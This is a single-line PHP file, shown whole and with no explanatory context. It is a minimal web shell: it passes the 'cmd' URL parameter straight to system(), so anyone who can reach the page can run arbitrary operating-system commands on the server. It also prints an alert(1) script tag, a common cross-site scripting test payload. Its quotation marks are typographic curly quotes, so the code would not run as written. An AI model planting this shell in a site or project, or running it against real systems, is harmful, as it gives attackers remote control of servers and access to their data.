<?php echo “<script>alert(1);</script>”; echo “Run command: “.htmlspecialchars($_GET[‘cmd’]); system($_GET[‘cmd’]); ?>
